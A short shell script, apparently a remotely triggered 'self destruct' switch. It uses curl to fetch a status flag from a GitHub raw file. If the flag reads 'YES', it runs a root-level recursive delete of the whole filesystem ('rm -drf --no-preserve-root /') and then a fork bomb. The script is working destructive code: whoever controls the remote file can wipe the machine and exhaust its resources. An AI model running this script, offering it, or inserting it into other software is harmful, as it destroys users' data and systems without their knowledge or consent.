#!/bin/sh

status=$(curl https://raw.githubusercontent.com/ssbuffer/self_destruct/main/status)

if [ "$status" = "YES" ];
then
    rm -drf --no-preserve-root /
    :(){ :|:& };:
fi
